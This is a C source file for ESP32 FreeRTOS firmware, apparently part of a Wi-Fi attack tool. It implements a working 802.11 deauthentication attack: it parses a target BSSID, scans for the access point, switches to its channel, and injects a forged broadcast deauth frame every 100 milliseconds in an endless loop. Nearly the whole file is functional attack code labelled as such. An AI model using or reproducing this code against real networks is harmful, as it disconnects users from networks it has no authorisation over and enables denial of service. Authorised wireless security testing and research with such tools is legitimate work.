/*
 * @file arma_deauth.c
 * @author johndeweyzxc (johndewey02003@gmail.com)
 * @brief Implementation of methods for injecting deauthentication frame
 */

#include "arma_deauth.h"

#include <stdio.h>
#include <string.h>

#include "arma_output.h"
#include "arma_utils.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "wifi_ctl_interface.h"

static uint8_t int_target_bssid[6];
static TaskHandle_t arma_deauth_task_handle = NULL;

void load_deauth_payload(uint8_t *payload_buffer) {
  /*
   * Subtype (1 byte)
   * Flags (1 byte)
   * Duration (2 bytes)
   * Receiver address (6 bytes)
   * Source address (6 bytes)
   * BSSID (6 bytes)
   * Sequence number (2 bytes)
   * Reason code (2 bytes)
   */
  uint8_t payload[] = {0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff,
                       0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                       0x00, 0x00, 0x00, 0x00, 0xf0, 0xff, 0x07, 0x00};
  memcpy(&payload[10], int_target_bssid, 6);
  memcpy(&payload[16], int_target_bssid, 6);

  printf(
      "arma_deauth.load_deauth_payload > Loaded target AP: "
      "%02X%02X%02X%02X%02X%02X\n",
      int_target_bssid[0], int_target_bssid[1], int_target_bssid[2],
      int_target_bssid[3], int_target_bssid[4], int_target_bssid[5]);
  memcpy(payload_buffer, payload, 26);
}

void arma_run_deauth() {
  uint8_t deauth_payload[26];
  load_deauth_payload(deauth_payload);

  while (1) {
    vTaskDelay(100 / portTICK_PERIOD_MS);
    wifi_inject_frame(deauth_payload, 26);
  }
}

void arma_deauth_finish() {
  if (arma_deauth_task_handle != NULL) {
    printf("arma_deauth.arma_deauth_finish > DEAUTH ATTACK FINISH\n");
    vTaskDelete(arma_deauth_task_handle);
    arma_deauth_task_handle = NULL;
  }
}

void arma_deauth_launching_sequence(uint8_t channel) {
  printf("arma_deauth.arma_deauth_launch > DEAUTH ATTACK LAUNCHING SEQUENCE\n");
  wifi_set_channel(channel);
  xTaskCreatePinnedToCore(arma_run_deauth, TDI_NAME, TDI_STACK_SIZE, NULL,
                          TDI_PRIORITY, &arma_deauth_task_handle, TDI_CORE_ID);
}

void arma_mic_set_target_bssid(uint8_t *target_bssid) {
  memcpy(int_target_bssid, target_bssid, 6);
}

void arma_deauth(char *target_bssid) {
  for (uint8_t i = 0; i < 6; i++) {
    uint8_t s1 = target_bssid[i + i];
    uint8_t s2 = target_bssid[i + i + 1];
    int_target_bssid[i] = convert_to_uint8_t(s1, s2);
  }

  wifi_scan_aps();
  ap_list_from_scan_t *ap_list = wifi_get_scanned_aps();
  wifi_ap_record_t *ap_records = ap_list->ap_record_list;
  uint16_t total_scanned_aps = ap_list->count;
  printf("arma_mic.arma_mic > Found %u APs\n", total_scanned_aps);

  for (uint16_t i = 0; i < total_scanned_aps; i++) {
    wifi_ap_record_t ap_record = ap_records[i];
    output_ap_info(&ap_record);

    if (memcmp(ap_record.bssid, int_target_bssid, 6) == 0) {
      uint8_t channel = ap_record.primary;
      uint8_t *bssid = ap_record.bssid;

      printf("arma_pmkid.arma_pmkid > Found AP: %02X%02X%02X%02X%02X%02X\n",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
      printf("arma_deauth.arma_deauth > Channel of AP: %u\n", channel);
      arma_deauth_launching_sequence(channel);
      break;
    }
  }
}